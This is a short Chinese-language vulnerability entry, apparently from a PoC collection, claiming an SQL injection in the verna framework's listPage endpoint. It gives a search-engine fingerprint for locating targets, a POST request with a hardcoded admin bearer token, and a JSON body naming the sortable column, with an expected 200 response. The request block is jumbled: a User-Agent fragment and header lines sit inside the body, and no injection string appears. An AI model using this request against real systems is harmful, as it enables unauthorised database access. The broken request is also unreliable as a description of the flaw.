# verna快速开发框架listPage存在SQL注⼊漏洞

- **系统**：verna　|　**类型**：其他　|　**CVE**：—
- **指纹**：`icon_hash="790525601"`
- **请求**：`POST /demo/dealer/listPage HTTP/1.1`
- **关键头**：`Content-Length: 93`　`Authorization: Bearer pig::admin::a0d42981-008a-436c-83dd-0c83699e5947`

**请求体 / payload**
```
like Gecko) Chrome/127.0.0.0 Safari/537.36
Content-Type: application/json;charset=UTF-8
{"orders":[{"column":"create_time","asc":false}],"current":1,"size":10,"extendFilterForm":
{}}
```
- **预期**：200　|　—